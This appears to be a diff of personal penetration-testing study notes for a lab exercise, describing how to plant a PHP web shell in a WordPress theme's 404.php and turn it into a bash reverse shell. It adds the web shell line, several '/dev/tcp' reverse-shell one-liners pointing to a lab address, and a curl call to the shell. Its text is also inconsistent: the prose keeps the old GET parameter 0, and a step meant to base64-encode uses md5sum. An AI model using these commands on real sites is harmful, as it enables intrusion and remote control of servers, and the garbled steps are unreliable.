@@ -130,13 +130,29 @@ An inactive theme can be selected to avoid corrupting the primary theme. We alre
 
 Click on Select after selecting the theme, and we can edit an uncommon page such as 404.php to add a web shell.
 
-web shell: system($_GET[0]);
+web shell: system($_GET["cmd"]);
+
+we can change the cmd into the oneliner shell 
+
+using bash -i >& /dev/tcp/ipaddress/port 0>&1
+
+or use 
+
+bash -c 'bash -i >& /dev/tcp/ipaddress/port 0>&1'
+
+
+
 
 The code above should let us execute commands via the GET parameter 0. We add this single line to the file just below the comments to avoid too much modification of the contents.
 
 Click on Update File at the bottom to save. We know that WordPress themes are located at /wp-content/themes/<theme name>. We can interact with the web shell via the browser or using cURL.
 
 As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target.
+
+create a reverseshell oneline and then base 64 encode the oneliner
+bash -c 'bash -i >& /dev/tcp/10.10.14.239/9001 0>&1'
+
+echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.239/9001 0>&1'" | md5sum
 
 example: curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
 
